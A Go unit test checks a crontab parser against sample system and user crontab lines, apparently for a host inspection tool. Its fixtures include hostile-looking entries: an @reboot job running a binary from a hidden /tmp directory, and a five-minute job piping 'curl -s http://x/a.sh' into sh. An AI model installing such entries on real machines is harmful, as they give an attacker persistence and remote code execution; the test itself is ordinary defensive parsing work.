package tasks

import "testing"

func TestParseCrontab(t *testing.T) {
	system := []string{
		"SHELL=/bin/sh",
		"# m h dom mon dow user command",
		"17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly",
		"@reboot root /tmp/.x/run --quiet",
		"bad line",
	}
	es := ParseCrontab("/etc/crontab", system, true, "")
	if len(es) != 2 {
		t.Fatalf("entries = %+v", es)
	}
	if es[0].User != "root" || es[0].Schedule != "17 * * * *" || es[0].Command != "cd / && run-parts --report /etc/cron.hourly" || es[0].Line != 3 {
		t.Errorf("entry0 = %+v", es[0])
	}
	if es[1].Schedule != "@reboot" || es[1].Command != "/tmp/.x/run --quiet" {
		t.Errorf("entry1 = %+v", es[1])
	}
	user := ParseCrontab("/var/spool/cron/crontabs/bob", []string{"*/5 * * * * curl -s http://x/a.sh | sh", "@hourly /home/bob/bin/backup"}, false, "bob")
	if len(user) != 2 || user[0].User != "bob" || user[0].Command != "curl -s http://x/a.sh | sh" || user[1].Command != "/home/bob/bin/backup" {
		t.Errorf("user crontab = %+v", user)
	}
}
